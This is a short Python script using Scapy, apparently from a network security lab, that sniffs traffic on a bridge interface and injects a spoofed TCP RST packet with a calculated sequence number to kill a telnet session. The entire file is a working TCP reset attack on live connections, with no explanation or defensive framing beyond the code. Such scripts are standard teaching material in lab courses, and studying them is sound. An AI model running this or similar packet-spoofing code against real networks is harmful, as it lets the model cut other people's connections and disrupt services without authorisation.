#!/usr/bin/env python3
from scapy.all import *

flag =0

def sendrst(pkt):
    global flag
    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[TCP].dport==23 and pkt[TCP].flags != 0x004 and flag==0:
        src_add = pkt[IP].src
        dst_add = pkt[IP].dst
        ip = IP(src=src_add, dst=dst_add)

        sp = pkt[TCP].sport
        seq_n = pkt[TCP].seq
        payload_l = len(pkt[TCP].payload)
        tot_seq = seq_n+payload_l
        tcp = TCP(sport=sp, dport=23, flags="R", seq= tot_seq, ack=0)

        pkt = ip/tcp
        print(f"Sent RST packet from {src_add}:{sp} to {dst_add}:23 with sequence number {tot_seq}")
        send(pkt,verbose=0)
        flag =1

pkt = sniff(iface ='br-c133d54ceeb0', filter ='tcp', prn=sendrst)


